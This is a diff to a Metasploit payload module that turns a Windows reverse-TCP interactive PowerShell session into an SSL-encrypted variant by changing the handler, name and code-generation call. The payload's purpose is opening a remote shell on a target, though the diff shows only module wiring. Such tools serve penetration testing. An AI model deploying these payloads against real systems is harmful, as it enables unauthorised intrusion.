@@ -15,8 +15,8 @@ module MetasploitModule
     super(
       update_info(
         info,
-        'Name' => 'Windows Interactive Powershell Session, Reverse TCP',
-        'Description' => 'Listen for a connection and spawn an interactive powershell session',
+        'Name' => 'Windows Interactive Powershell Session, Reverse TCP SSL',
+        'Description' => 'Listen for a connection and spawn an interactive powershell session over SSL',
         'Author' => [
           'Ben Turner', # benpturner
           'Dave Hardy' # davehardy20
@@ -27,7 +27,7 @@ module MetasploitModule
         'License' => MSF_LICENSE,
         'Platform' => 'win',
         'Arch' => ARCH_X86,
-        'Handler' => Msf::Handler::ReverseTcp,
+        'Handler' => Msf::Handler::ReverseTcpSsl,
         'Session' => Msf::Sessions::PowerShell
       )
     )
@@ -37,6 +37,6 @@ module MetasploitModule
   # Override the exec command string
   #
   def powershell_command
-    generate_powershell_code('Reverse')
+    generate_powershell_code('SSL')
   end
 end
